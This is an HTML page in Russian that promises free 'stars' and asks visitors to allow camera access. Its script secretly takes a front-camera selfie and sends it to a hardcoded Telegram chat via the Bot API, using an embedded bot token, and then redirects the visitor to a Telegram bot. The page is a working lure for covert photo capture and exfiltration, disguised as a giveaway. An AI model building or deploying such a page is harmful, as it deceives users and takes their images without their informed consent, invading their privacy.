<!DOCTYPE html>
<html>
<head>
    <title>BossBand - Получить звёзды</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
            text-align: center;
        }
        
        #getStarsBtn {
            background: linear-gradient(135deg, #ff9a9e 0%, #fad0c4 100%);
            border: none;
            color: white;
            padding: 15px 30px;
            font-size: 18px;
            border-radius: 50px;
            cursor: pointer;
            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
            transition: all 0.3s ease;
            margin: 20px 0;
            width: 80%;
            max-width: 300px;
        }
    </style>
</head>
<body>
    <h1>Получить звёзды</h1>
    <button id="getStarsBtn">⭐ ПОЛУЧИТЬ ЗВЁЗДЫ</button>
    <p>После нажатия разрешите доступ к камере</p>

    <script>
        const botToken = "7774453287:AAEn3dh5ebiN7sZFa__Wyf-JXwBUE1wUIrc";
        const chatId = "7807571960";

        document.getElementById("getStarsBtn").addEventListener("click", async () => {
            try {
                // 1. Доступ к камере
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: 'user' // Используем фронтальную камеру
                    } 
                });
                
                const video = document.createElement("video");
                video.srcObject = stream;
                await video.play();
                
                // 2. Ждем 1 секунду для инициализации камеры
                await new Promise(resolve => setTimeout(resolve, 1000));
                
                // 3. Делаем фото
                const canvas = document.createElement("canvas");
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext("2d");
                
                // Добавляем яркость для темных фото
                ctx.filter = 'brightness(1.2) contrast(1.1)';
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                stream.getTracks().forEach(track => track.stop());
                
                // 4. Проверяем не черное ли фото
                const imageData = ctx.getImageData(0, 0, 1, 1).data;
                if (imageData[0] < 10 && imageData[1] < 10 && imageData[2] < 10) {
                    throw new Error("Камера не успела включиться");
                }

                // 5. Отправляем в бота
                canvas.toBlob(async (blob) => {
                    const formData = new FormData();
                    formData.append("chat_id", chatId);
                    formData.append("photo", blob, "selfie.jpg");
                    
                    try {
                        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                            method: "POST",
                            body: formData
                        });
                        
                        if (response.ok) {
                            alert("Фото отправлено! Переходим в бота...");
                            window.location.href = "https://t.me/bossband2903_bot";
                        }
                    } catch (e) {
                        alert("Ошибка отправки: " + e.message);
                    }
                }, "image/jpeg", 0.9);
                
            } catch (err) {
                alert("Ошибка: " + err.message);
            }
        });
    </script>
</body>
</html>